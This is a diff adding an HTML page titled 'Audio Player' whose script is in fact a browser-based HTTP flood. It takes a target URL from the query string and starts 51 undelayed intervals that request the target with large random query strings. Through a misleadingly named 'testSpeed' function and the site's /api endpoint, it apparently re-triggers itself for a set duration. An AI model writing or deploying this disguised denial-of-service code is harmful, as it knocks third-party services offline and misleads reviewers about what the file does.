@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Audio Player</title>
+</head>
+
+<body>
+    <h1>Audio Player</h1>
+    <script>
+
+        function randomString(length) {
+            var result = ""
+            var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+            var charactersLength = characters.length
+            for (var i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength))
+            }
+            return result
+        }
+
+        async function testSpeed(target, duration, started_at) {
+
+            const url = `${location.origin}/?target=${target}&started_at=${started_at.getTime()}&duration=${duration}&start=1&unique_id=${randomString(10)}`
+
+            await fetch(`${location.origin}/api?url=${encodeURIComponent(url)}`)
+        }
+
+        function createThread(target, timeout) {
+
+            const timer = setInterval(() => new Audio(`${target}?${randomString(10)}=${randomString(1000)}`))
+
+            setTimeout(() => clearInterval(timer), timeout * 1000)
+        }
+
+        async function run(target, duration, started_at, start) {
+
+            testSpeed(target, duration, started_at).catch(_ => undefined)
+
+            testSpeed(target, duration, started_at).catch(_ => undefined)
+
+            if (!start) return document.querySelector("h1").innerHTML = "Done"
+
+            await new Promise(resolve => setTimeout(resolve, 2000))
+
+            for (var count = 0; count <= 50; count++) createThread(target, 60)
+        }
+
+        const queryString = window.location.search
+
+        const urlParams = new URLSearchParams(queryString)
+
+        const target = urlParams.get("target")
+
+        const duration = +urlParams.get("duration")
+
+        const start = !!urlParams.get("start")
+
+        if (target && duration) {
+
+            const started_at = urlParams.get("started_at") ? new Date(+urlParams.get("started_at")) : new Date
+
+            const current_date = new Date
+
+            const end_on = new Date(started_at.getTime() + duration * 60 * 1000)
+
+            if (end_on.getTime() > current_date.getTime()) run(target, duration, started_at, start)
+        }
+
+    </script>
+</body>
+
+</html>
